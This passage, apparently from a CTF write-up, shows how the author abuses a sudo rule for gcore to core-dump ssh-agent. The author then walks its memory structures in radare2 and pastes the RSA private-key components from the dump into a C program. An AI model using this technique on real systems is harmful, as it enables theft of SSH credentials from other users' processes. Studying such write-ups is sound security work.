+</span></span><span style=display:flex><span>User vault may run the following commands on 37565c96ce52:
+</span></span><span style=display:flex><span>    <span style=color:#9ece6a;font-weight:700>(</span>root<span style=color:#9ece6a;font-weight:700>)</span> NOPASSWD: /usr/bin/gcore
+</span></span><span style=display:flex><span>$ ps -ef
+</span></span><span style=display:flex><span>UID          PID    PPID  C STIME TTY          TIME CMD
+</span></span><span style=display:flex><span>root           <span style=color:#e0af68>1</span>       <span style=color:#e0af68>0</span>  <span style=color:#e0af68>0</span> 03:34 ?        00:00:00 sh /root/start.sh
+</span></span><span style=display:flex><span>root           <span style=color:#e0af68>8</span>       <span style=color:#e0af68>1</span>  <span style=color:#e0af68>0</span> 03:34 ?        00:00:00 su - vault -c /home/vault/vault.sh
+</span></span><span style=display:flex><span>vault         <span style=color:#e0af68>11</span>       <span style=color:#e0af68>8</span>  <span style=color:#e0af68>0</span> 03:34 ?        00:00:00 /bin/sh /home/vault/vault.sh
+</span></span><span style=display:flex><span>vault         <span style=color:#e0af68>15</span>      <span style=color:#e0af68>11</span>  <span style=color:#e0af68>0</span> 03:34 ?        00:00:02 python /home/vault/server.py
+</span></span><span style=display:flex><span>alice         <span style=color:#e0af68>16</span>       <span style=color:#e0af68>1</span>  <span style=color:#e0af68>0</span> 03:34 ?        00:00:00 ssh-agent -s
+</span></span><span style=display:flex><span>root          <span style=color:#e0af68>18</span>       <span style=color:#e0af68>1</span>  <span style=color:#e0af68>0</span> 03:34 ?        00:00:00 /usr/sbin/sshd -D
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>Remember that there&rsquo;s an ssh-agent running, we can take a core dump of ssh-agent and maybe extract the ssh key that saved inside of it. This blog post and GitHub repo perfectly describe our current situation <a href=https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/>https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/</a> and <a href=https://github.com/NetSPI/sshkey-grab/>https://github.com/NetSPI/sshkey-grab/</a>. Trying the parse_mem script from the GitHub repo, and only to find out we can&rsquo;t use it even after porting the script to python3. Thus, now comes the second pain, somehow we have the snapshot of ssh-agent memory, we need to take out the ssh key that&rsquo;s stored inside of it.</p><p>This is where we need to reverse engineer and reading the ssh-agent code (<a href=https://anongit.mindrot.org/openssh.git/tree/ssh-agent.c>https://anongit.mindrot.org/openssh.git/tree/ssh-agent.c</a>). If you read the code, ssh-agent stores ssh keys into a global var</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>struct</span> idtable {
+</span></span><span style=display:flex><span>	<span style=color:#41a6b5>int</span> nentries;
+</span></span><span style=display:flex><span>	<span style=color:#7aa2f7>TAILQ_HEAD</span>(idqueue, identity) idlist;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>/* private key table */</span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>struct</span> idtable <span style=color:#9ece6a;font-weight:700>*</span>idtab;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#bb9af7>static</span> <span style=color:#41a6b5>void</span>
+</span></span><span style=display:flex><span><span style=color:#7aa2f7>process_remove_all_identities</span>(SocketEntry <span style=color:#9ece6a;font-weight:700>*</span>e)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	Identity <span style=color:#9ece6a;font-weight:700>*</span>id;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#7aa2f7>debug2_f</span>(<span style=color:#9ece6a>&#34;entering&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* Loop over all identities and clear the keys. */</span>
+</span></span><span style=display:flex><span>	<span style=color:#bb9af7>for</span> (id <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>TAILQ_FIRST</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>idtab<span style=color:#9ece6a;font-weight:700>-&gt;</span>idlist); id;
+</span></span><span style=display:flex><span>	    id <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>TAILQ_FIRST</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>idtab<span style=color:#9ece6a;font-weight:700>-&gt;</span>idlist)) {
+</span></span><span style=display:flex><span>		<span style=color:#7aa2f7>TAILQ_REMOVE</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>idtab<span style=color:#9ece6a;font-weight:700>-&gt;</span>idlist, id, next);
+</span></span><span style=display:flex><span>		<span style=color:#7aa2f7>free_identity</span>(id);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* Mark that there are no identities. */</span>
+</span></span><span style=display:flex><span>	idtab<span style=color:#9ece6a;font-weight:700>-&gt;</span>nentries <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* Send success. */</span>
+</span></span><span style=display:flex><span>	<span style=color:#7aa2f7>send_status</span>(e, <span style=color:#e0af68>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><strong>idtab</strong> is exactly where we need to take a look. ssh-agent binary on the server is heavily optimized and striped, but you can still make sense out of it with string xref. For example, take a look at this IDA decompilation output and ssh-agent part of the code</p><p><a href=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGbxWJyVGWWSTVASjPAx-pGjXUvkKAZ8ou4-MZcsVbwoV3u3CIkeuHJAxPjSJtLoDdr1Fl0S-w_NWJYsrNCfGOFIQi_qgxdSwBFrYRlJyuNuxrB0_JQ_icBXrGs_QgEKlfXOzXt-h1aZM/s1246/Screen+Shot+2021-04-25+at+11.37.40.png><img src=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGbxWJyVGWWSTVASjPAx-pGjXUvkKAZ8ou4-MZcsVbwoV3u3CIkeuHJAxPjSJtLoDdr1Fl0S-w_NWJYsrNCfGOFIQi_qgxdSwBFrYRlJyuNuxrB0_JQ_icBXrGs_QgEKlfXOzXt-h1aZM/w676-h278/Screen+Shot+2021-04-25+at+11.37.40.png alt></a></p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>static</span> <span style=color:#41a6b5>void</span>
+</span></span><span style=display:flex><span><span style=color:#7aa2f7>idtab_init</span>(<span style=color:#41a6b5>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	idtab <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>xcalloc</span>(<span style=color:#e0af68>1</span>, <span style=color:#bb9af7>sizeof</span>(<span style=color:#9ece6a;font-weight:700>*</span>idtab));
+</span></span><span style=display:flex><span>	<span style=color:#7aa2f7>TAILQ_INIT</span>(<span style=color:#9ece6a;font-weight:700>&amp;</span>idtab<span style=color:#9ece6a;font-weight:700>-&gt;</span>idlist);
+</span></span><span style=display:flex><span>	idtab<span style=color:#9ece6a;font-weight:700>-&gt;</span>nentries <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#ifdef HAVE_SETRLIMIT
+</span></span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* deny core dumps, since memory contains unencrypted private keys */</span>
+</span></span><span style=display:flex><span>	rlim.rlim_cur <span style=color:#9ece6a;font-weight:700>=</span> rlim.rlim_max <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>	<span style=color:#bb9af7>if</span> (<span style=color:#7aa2f7>setrlimit</span>(RLIMIT_CORE, <span style=color:#9ece6a;font-weight:700>&amp;</span>rlim) <span style=color:#9ece6a;font-weight:700>==</span> <span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>1</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#7aa2f7>error</span>(<span style=color:#9ece6a>&#34;setrlimit RLIMIT_CORE: %s&#34;</span>, <span style=color:#7aa2f7>strerror</span>(errno));
+</span></span><span style=display:flex><span>		<span style=color:#7aa2f7>cleanup_exit</span>(<span style=color:#e0af68>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#endif
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#9ece6a>skip</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	cleanup_pid <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>getpid</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#ifdef ENABLE_PKCS11
+</span></span></span><span style=display:flex><span>	<span style=color:#7aa2f7>pkcs11_init</span>(<span style=color:#e0af68>0</span>);
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#endif
+</span></span></span><span style=display:flex><span>	<span style=color:#7aa2f7>new_socket</span>(AUTH_SOCKET, sock);
+</span></span><span style=display:flex><span>	<span style=color:#bb9af7>if</span> (ac <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>0</span>)
+</span></span><span style=display:flex><span>		parent_alive_interval <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#e0af68>10</span>;
+</span></span><span style=display:flex><span>	<span style=color:#7aa2f7>idtab_init</span>();
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>It&rsquo;s not really perfectly the same because of the inlined function, but you can still make some assumptions that this is the same part as the code. So, now we have <strong>0x4F7C0</strong> as <strong>idtab</strong> offset from ELF base. Time to see the struct in radare2, (to get the ELF base just search for ELF string with <strong>/ ELF</strong>, there is some output but the real PIE base is usually starts with 0x5&mldr;)</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; pxq <span style=color:#e0af68>8</span> @ 0x559d66738000+0x4f7c0
+</span></span><span style=display:flex><span>0x559d667877c0  0x0000559d672b32e0                       .2+g.U..
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; pxq <span style=color:#e0af68>32</span> @ 0x0000559d672b32e0
+</span></span><span style=display:flex><span>0x559d672b32e0  0x0000000000000001  0x0000559d672b8740   ........@.+g.U..
+</span></span><span style=display:flex><span>0x559d672b32f0  0x0000559d672b8740  0x0000000000000231   @.+g.U..1.......
+</span></span></code></pre></div><p>The first qword is exactly the number of entries and next to it is the pointer to identity struct.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#bb9af7>typedef</span> <span style=color:#bb9af7>struct</span> identity {
+</span></span><span style=display:flex><span>    	<span style=color:#7aa2f7>TAILQ_ENTRY</span>(identity) next;
+</span></span><span style=display:flex><span>    	<span style=color:#bb9af7>struct</span> sshkey <span style=color:#9ece6a;font-weight:700>*</span>key;
+</span></span><span style=display:flex><span>    	<span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>comment;
+</span></span><span style=display:flex><span>    	<span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>provider;
+</span></span><span style=display:flex><span>    	<span style=color:#41a6b5>time_t</span> death;
+</span></span><span style=display:flex><span>    	u_int confirm;
+</span></span><span style=display:flex><span>    	<span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>sk_provider;
+</span></span><span style=display:flex><span>    } Identity;
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; pxq 0x48 @ 0x0000559d672b8740
+</span></span><span style=display:flex><span>0x559d672b8740  0x0000000000000000  0x0000559d672b32e8   .........2+g.U..
+</span></span><span style=display:flex><span>0x559d672b8750  0x0000559d672b8910  0x0000559d672b5750   ..+g.U..PW+g.U..
+</span></span><span style=display:flex><span>0x559d672b8760  0x0000000000000000  0x0000000000000000   ................
+</span></span><span style=display:flex><span>0x559d672b8770  0x0000000000000000  0x0000000000000000   ................
+</span></span><span style=display:flex><span>0x559d672b8780  0x0000000000000000                       ........
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; ps @ 0x0000559d672b5750
+</span></span><span style=display:flex><span>alice@795df6b1e11b
+</span></span></code></pre></div><p>The first 2 qwords are reserved for the TAILQ struct that&rsquo;s used for linked list, so our real data starts after it. That means <strong>0x0000559d672b8910</strong> is our pointer to ssh key and <strong>0x0000559d672b5750</strong> is our pointer to the comment string, and indeed it contains <strong>alice@&mldr;.</strong>. At this point, I was so glad, because I&rsquo;m already on the right track.</p><p>This is the content of ssh key and inside of it, we have a pointer to an RSA struct.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>// https://anongit.mindrot.org/openssh.git/tree/sshkey.h#n125
+</span></span></span><span style=display:flex><span><span style=color:#bb9af7>struct</span> sshkey {
+</span></span><span style=display:flex><span>	<span style=color:#41a6b5>int</span>	 type;
+</span></span><span style=display:flex><span>	<span style=color:#41a6b5>int</span>	 flags;
+</span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* KEY_RSA */</span>
+</span></span><span style=display:flex><span>	RSA	<span style=color:#9ece6a;font-weight:700>*</span>rsa;
+</span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* KEY_DSA */</span>
+</span></span><span style=display:flex><span>	DSA	<span style=color:#9ece6a;font-weight:700>*</span>dsa;
+</span></span><span style=display:flex><span>	<span style=color:#414868;font-style:italic>/* KEY_ECDSA and KEY_ECDSA_SK */</span>
+</span></span><span style=display:flex><span>	<span style=color:#41a6b5>int</span>	 ecdsa_nid;	<span style=color:#414868;font-style:italic>/* NID of curve */</span>
+</span></span><span style=display:flex><span>	EC_KEY	<span style=color:#9ece6a;font-weight:700>*</span>ecdsa;
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>/*
+[0x7f9a71bbc7e4]> pxq 0x70 @ 0x0000559d672b8910
+0x559d672b8910 0x0000000000000000 0x0000559d672b3640 &mldr;&mldr;..@6+g.U..
+0x559d672b8920 0x0000000000000000 0x00000000ffffffff &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b8930 0x0000000000000000 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b8940 0x0000000000000000 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b8950 0x0000000000000000 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b8960 0x0000000000000000 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b8970 0x0000000000000000 0x0000000000000071 &mldr;&mldr;..q&mldr;&mldr;.
+[0x7f9a71bbc7e4]> pxq @ 0x0000559d672b3640
+0x559d672b3640 0x0000000000000000 0x00007f9a71f72e80 &mldr;&mldr;&mldr;..q&mldr;.
+0x559d672b3650 0x0000000000000000 0x0000559d672b8120 &mldr;&mldr;.. .+g.U..
+0x559d672b3660 0x0000559d672b6490 0x0000559d672b6340 .d+g.U..@c+g.U..
+0x559d672b3670 0x0000559d672b5160 0x0000559d672b88f0 `Q+g.U&mldr;.+g.U..
+0x559d672b3680 0x0000559d672b8140 0x0000559d672b4e90 @.+g.U&mldr;N+g.U..
+0x559d672b3690 0x0000559d672b4ee0 0x0000000000000000 .N+g.U&mldr;&mldr;&mldr;.
+0x559d672b36a0 0x0000000000000000 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b36b0 0x0000000e00000001 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b36c0 0x0000000000000000 0x0000000000000000 &mldr;&mldr;&mldr;&mldr;&mldr;.
+0x559d672b36d0 0x0000000000000000 0x0000559d672b8180 &mldr;&mldr;&mldr;.+g.U..
+0x559d672b36e0 0x0000000000000000 0x0000559d672b52e0 &mldr;&mldr;&mldr;R+g.U..
+0x559d672b36f0 0x0000000000000000 0x0000000000000091 &mldr;&mldr;&mldr;&mldr;&mldr;.
+*/</p><pre tabindex=0><code>
+RSA is taken out of OpenSSL implementation and it&#39;s heavily using OpenSSL BIGNUM.
+
+```c
+// https://code.woboq.org/crypto/openssl/crypto/rsa/rsa.h.html#rsa_st
+struct rsa_st
+    {
+    /* The first parameter is used to pickup errors where
+     * this is passed instead of aEVP_PKEY, it is set to 0 */
+    int pad;
+    long version;
+    const RSA_METHOD *meth;
+    /* functional reference if &#39;meth&#39; is ENGINE-provided */
+    ENGINE *engine;
+    BIGNUM *n;
+    BIGNUM *e;
+    BIGNUM *d;
+    BIGNUM *p;
+    BIGNUM *q;
+    BIGNUM *dmp1;
+    BIGNUM *dmq1;
+    BIGNUM *iqmp;
+    /* be careful using this if the RSA structure is shared */
+    CRYPTO_EX_DATA ex_data;
+    int references;
+    int flags;
+...
+</code></pre><p>At this point, you just need to parse the pointers to n, e, d, p, q, &mldr;.. For example, e is the fifth qword of RSA struct,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; pxq <span style=color:#e0af68>16</span> @ 0x0000559d672b6490
+</span></span><span style=display:flex><span>0x559d672b6490  0x0000559d672b3620  0x0000000100000001    6+g.U..........
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; <span style=color:#414868;font-style:italic># first is BIGNUM pointer to d, and second is BIGNUM top value</span>
+</span></span><span style=display:flex><span><span style=color:#9ece6a;font-weight:700>[</span>0x7f9a71bbc7e4<span style=color:#9ece6a;font-weight:700>]</span>&gt; pxq <span style=color:#e0af68>16</span> @ 0x0000559d672b3620
+</span></span><span style=display:flex><span>0x559d672b3620  0x0000000000010001  0x0000559d672b4db0   .........M+g.U..
+</span></span></code></pre></div><p>and it&rsquo;s indeed our value to e (0x10001). Here&rsquo;s the script to do the rest</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;openssl/bn.h&gt;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;openssl/ossl_typ.h&gt;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdint.h&gt;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#include</span> <span style=color:#414868;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#414868;font-style:italic>
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uint64_t</span> p[] <span style=color:#9ece6a;font-weight:700>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x3be14a864041825dULL</span>, <span style=color:#e0af68>0xed43050b8e04e488ULL</span>, <span style=color:#e0af68>0xf1be8b3bcd095f0eULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xcd30528134778f65ULL</span>, <span style=color:#e0af68>0xa0cab1f8c45923f6ULL</span>, <span style=color:#e0af68>0x406bd8bd8de1fb88ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x2ce91d3d6ad7d8caULL</span>, <span style=color:#e0af68>0x484279fa9dda444cULL</span>, <span style=color:#e0af68>0x6a8bda7decb9bf28ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x1c30447b4c53b827ULL</span>, <span style=color:#e0af68>0xaf8e2f25f2138a32ULL</span>, <span style=color:#e0af68>0xa2ba43be016dbd42ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xe732fcbcab80cbd2ULL</span>, <span style=color:#e0af68>0x430e8a61dee31b07ULL</span>, <span style=color:#e0af68>0x149453c0841e16e5ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xee29a73bdc029a08ULL</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uint64_t</span> q[] <span style=color:#9ece6a;font-weight:700>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xd60922a0489bb76fULL</span>, <span style=color:#e0af68>0xc0ecb819543a5054ULL</span>, <span style=color:#e0af68>0x316e7ae07e179dedULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xb9f7479f641753b6ULL</span>, <span style=color:#e0af68>0xc8488cae9660ff97ULL</span>, <span style=color:#e0af68>0x84f2c891984853b0ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x442a09032a64a320ULL</span>, <span style=color:#e0af68>0xad992d53ee8ddf8aULL</span>, <span style=color:#e0af68>0xf817987c2c127fc0ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x99a80a001a816a8aULL</span>, <span style=color:#e0af68>0x187b5f7b931f979dULL</span>, <span style=color:#e0af68>0x62e1f9c94e6979ccULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x1b80d9a6cecd78d0ULL</span>, <span style=color:#e0af68>0xc18f881921561f0cULL</span>, <span style=color:#e0af68>0x2e1a2874130fcbecULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xdf190eeb59b30149ULL</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uint64_t</span> n[] <span style=color:#9ece6a;font-weight:700>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x13d77098c6e70153ULL</span>, <span style=color:#e0af68>0xb16734ea8f415c7aULL</span>, <span style=color:#e0af68>0xf6c1d7a24d7912d5ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xf07dad19cbb79002ULL</span>, <span style=color:#e0af68>0xeb3c099ab487f180ULL</span>, <span style=color:#e0af68>0x5d5aa6cbad40e531ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x307616dd9b41411dULL</span>, <span style=color:#e0af68>0xa1cc75c88187a570ULL</span>, <span style=color:#e0af68>0x3cd02a8b3834d842ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xd4f4429bbddff9f7ULL</span>, <span style=color:#e0af68>0x288ec4d8c8148c4eULL</span>, <span style=color:#e0af68>0xd71fed2d250cc0d1ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x258661498cde4070ULL</span>, <span style=color:#e0af68>0x8dace20c6e37c2f9ULL</span>, <span style=color:#e0af68>0x2b7b9ef5f0463e96ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0xb8aafb929ebf74e7ULL</span>, <span style=color:#e0af68>0x865d485dac68e895ULL</span>, <span style=color:#e0af68>0x6f29a98d570a704aULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x738af70adcb9cda5ULL</span>, <span style=color:#e0af68>0xeaf05781ef72a1fcULL</span>, <span style=color:#e0af68>0xe8220c857c2e0dd4ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x302642c692dae903ULL</span>, <span style=color:#e0af68>0x67c7abb749751baaULL</span>, <span style=color:#e0af68>0x34541dfe55dbec90ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x9fdc06ad71832d2cULL</span>, <span style=color:#e0af68>0xf642557e840d79e2ULL</span>, <span style=color:#e0af68>0xdbea7641a56477d6ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x47d87d7417348bfbULL</span>, <span style=color:#e0af68>0x96e2994306470bd8ULL</span>, <span style=color:#e0af68>0x8886b2adc9464d21ULL</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e0af68>0x2c4a893260202a0eULL</span>, <span style=color:#e0af68>0xcf8d989fb4538ddfULL</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uint64_t</span> d[] <span style=color:#9ece6a;font-weight:700>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xc970494fe69c1c29ULL</span>, <span style=color:#e0af68>0x5a4a3daa3686b40fULL</span>, <span style=color:#e0af68>0x92c7522a35634fb7ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x7001df21dc30fa52ULL</span>, <span style=color:#e0af68>0xcd09d2125bbed001ULL</span>, <span style=color:#e0af68>0x17d29354edf69d32ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x64104b587101b58cULL</span>, <span style=color:#e0af68>0x401ffbfc989981d5ULL</span>, <span style=color:#e0af68>0x30016da97f319fb9ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x3b593593706eda4aULL</span>, <span style=color:#e0af68>0xa42a82066cff7b65ULL</span>, <span style=color:#e0af68>0xfd397d3f26824bebULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xc794c5fe25c5fa23ULL</span>, <span style=color:#e0af68>0x76b839d8ce910db5ULL</span>, <span style=color:#e0af68>0xf883e0c6e51e2d5fULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x1b889968692568caULL</span>, <span style=color:#e0af68>0x223590e9b979da4aULL</span>, <span style=color:#e0af68>0xfa1a3aba55f8c628ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xcee6c0b2ac7e717aULL</span>, <span style=color:#e0af68>0x9cb3d4945918600cULL</span>, <span style=color:#e0af68>0x85a5ea4e778a8afdULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xe79358416aef1be1ULL</span>, <span style=color:#e0af68>0xfefb0c4a293590a7ULL</span>, <span style=color:#e0af68>0xa5bdadb88776b3c9ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xf4a7e46993e3cb8bULL</span>, <span style=color:#e0af68>0x64434d55aa4042b6ULL</span>, <span style=color:#e0af68>0x477f05b4dc35e237ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x1438f34294c154d9ULL</span>, <span style=color:#e0af68>0xe93a6c28346def01ULL</span>, <span style=color:#e0af68>0x0ff80a5eb1a45a7fULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x85c0cfe4f8337574ULL</span>, <span style=color:#e0af68>0x5de8ee76cc6bc5d4ULL</span>
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uint64_t</span> c[] <span style=color:#9ece6a;font-weight:700>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xeb93e80ec4d7142fULL</span>, <span style=color:#e0af68>0xe46d6e5c4c445e90ULL</span>, <span style=color:#e0af68>0x405731b6a0cdfd88ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xe988b1463dba43e3ULL</span>, <span style=color:#e0af68>0xdbaae4cd9b6f08ceULL</span>, <span style=color:#e0af68>0x41987261d284b062ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x33749e6eadc4cc63ULL</span>, <span style=color:#e0af68>0x7069525cccad597fULL</span>, <span style=color:#e0af68>0xca4cc726153f5503ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xab6febe1bf762849ULL</span>, <span style=color:#e0af68>0xfe18056a07a53f5fULL</span>, <span style=color:#e0af68>0x34a9088adf0137e7ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0xf3e0ba1066c3f45fULL</span>, <span style=color:#e0af68>0xa47a451bc90ea084ULL</span>, <span style=color:#e0af68>0xf34baebaffb37fd3ULL</span>,
+</span></span><span style=display:flex><span>  <span style=color:#e0af68>0x0ab32488acac9a92ULL</span>
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
